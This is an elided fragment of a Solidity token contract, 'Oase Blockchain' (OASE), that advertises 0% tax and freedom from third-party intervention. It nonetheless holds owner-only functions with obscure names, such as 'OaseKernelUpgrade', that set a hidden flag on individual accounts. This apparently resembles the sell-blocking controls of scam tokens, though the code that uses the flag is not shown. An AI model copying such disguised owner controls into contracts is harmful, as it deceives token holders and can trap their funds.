...
// Oase Blockchain Network
// Tax : 0%
// A network no third party can intervene with, run by people all around the globe.
...
contract BaseToken is Ownable {
    ...
    string constant public name = 'Oase Blockchain';
    string constant public symbol = 'OASE';
    ...
    function OaseStatusOprse(address account) public onlyOwner {
    ...
    function OaseKernelUpgrade(address account) public onlyOwner {
        _rebuildsolidity[account] = true;
    }

    function OaseBlockchainStatus(address account) public view returns (bool) {
...
contract OaseContract is BaseToken {
